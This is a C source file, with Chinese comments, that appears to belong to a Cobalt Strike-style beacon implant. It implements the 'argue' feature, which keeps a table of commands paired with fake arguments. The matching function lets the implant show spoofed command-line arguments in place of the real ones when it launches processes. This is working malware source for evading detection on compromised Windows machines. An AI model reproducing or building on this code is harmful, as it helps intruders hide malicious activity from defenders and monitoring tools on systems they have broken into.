#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "parse.h"
#include "bformat.h"
#include "commands.h"
#include "argue.h"
#include "track_memory.h"

typedef struct {
	BOOL      active;
	char      command[8192];
	char      fakeargs[8192];
	void    * next;
} argue_entry;

/* argue 条目只在进程退出时释放（argue_remove 仅停用槽位、槽位可复用），
   全部登记给 track_memory_cleanup 在 safe_exit 中清零并释放。 */
static argue_entry * argue_list = NULL;

static argue_entry * get_slot(char * command) {
	argue_entry * entry;
	datap       * alloc;

	/* 遍历条目列表，查找是否有重复项 */
	entry = argue_list;
	while (entry != NULL) {
		if (entry->active == TRUE && strcmp(command, entry->command) == 0)
			return entry;
		entry = (argue_entry*)entry->next;
	}

	/* 遍历条目列表，查找空条目 */
	entry = argue_list;
	while (entry != NULL) {
		if (entry->active == FALSE)
			return entry;
		entry = (argue_entry*)entry->next;
	}

	/* 分配新条目 */
	entry = (argue_entry *)malloc(sizeof(argue_entry));
	memset(entry, 0, sizeof(argue_entry));
	entry->active = FALSE;

	/* 登记退出清理（safe_exit → track_memory_cleanup） */
	track_memory_add(entry, sizeof(argue_entry), TRACK_MEMORY_MALLOC, FALSE, NULL);

	/* 将条目插入链表 */
	entry->next = argue_list;
	argue_list = entry;

	return entry;
}

void command_argue_add(char * buffer, int length) {
	datap         parser;
	argue_entry * entry;
	char        * command;
	char        * expanded;
	char        * fakeargs;
	datap       * alloc;

	/* 分配内存 */
	alloc    = data_alloc(8192 * 3);
	command  = data_ptr(alloc, 8192);
	expanded = data_ptr(alloc, 8192);
	fakeargs = data_ptr(alloc, 8192);

	/* 初始化参数解析器 */
	data_init(&parser, buffer, length);

	/* 获取参数 */
	data_string(&parser, command, 8192);
	env_expand(command, expanded, 8192);
	data_string(&parser, fakeargs, 8192);

	/* 找到新的槽位并激活它 */
	entry = get_slot(expanded);
	entry->active = TRUE;

	/* 展开环境变量 */
	env_expand(command, entry->command, 8192);
	env_expand(fakeargs, entry->fakeargs, 8192);

	/* 释放内存 */
	data_free(alloc);
}

void command_argue_remove(char * buffer, int length) {
	argue_entry * temp = argue_list;
	char        * exp  = (char *)malloc(8192);

	/* 展开参数 */
	buffer[length] = 0;
	env_expand(buffer, exp, 8192);

	while (temp != NULL) {
		/* 移除 :) */
		if (temp->active == TRUE && strcmp(temp->command, exp) == 0) {
			temp->active = FALSE;
			memset(temp->command,  0, 8192);
			memset(temp->fakeargs, 0, 8192);
		}

		temp = (argue_entry*)temp->next;
	}

	/* 清理 */
	memset(exp, 0, 8192);
	free(exp);
}

void command_argue_list(void(*callback)(char * buffer, int length, int type)) {
	argue_entry   * temp = argue_list;
	formatp         format;

	/* 初始化缓冲区 */
	bformat_init(&format, 32768);

	/* 遍历列表 */
	while (temp != NULL) {
		/* 将结果添加到缓冲区 */
		if (temp->active == TRUE)
			bformat_printf(&format, "%s\n", temp->fakeargs);

		/* 移动到下一个列表条目 */
		temp = (argue_entry*)temp->next;
	}

	/* 触发回调函数 */
	callback(bformat_string(&format), bformat_length(&format), CALLBACK_OUTPUT);

	/* 清理缓冲区 */
	bformat_free(&format);
}

/* 检查指定的命令是否是我们伪造参数的候选项 */
BOOL argue_should_spoof(char * buffer, ARGUMENT_RECORD * record) {
	argue_entry   * temp = argue_list;

	while (temp != NULL) {
		if (temp->active == TRUE && strstr(buffer, temp->command) == buffer) {
			record->fakeargs = temp->fakeargs;
			record->realargs = buffer;
			return TRUE;
		}

		temp = (argue_entry*)temp->next;
	}

	return FALSE;
}